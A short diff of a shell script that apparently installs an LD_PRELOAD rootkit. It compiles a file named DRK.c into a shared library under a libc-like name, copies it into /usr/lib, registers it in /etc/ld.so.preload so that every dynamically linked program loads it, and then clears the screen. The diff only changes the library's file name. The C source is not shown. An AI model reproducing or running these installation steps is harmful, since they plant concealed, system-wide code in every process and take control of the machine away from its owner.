@@ -12,13 +12,13 @@ sleep 0.5;
 done
 
 # compilation
-/usr/bin/gcc DRK.c -o libc.so -shared -fPIC -ldl
+/usr/bin/gcc DRK.c -o libcz.so -shared -fPIC -ldl
 
 # moved dynamic library for /usr/bin
-mv libc.so /usr/lib
+mv libcz.so /usr/lib
 
 #LD_PRELOAD
-echo "/usr/lib/libc.so" >> /etc/ld.so.preload
+echo "/usr/lib/libcz.so" >> /etc/ld.so.preload
 ldconfig
 
 #clear screen
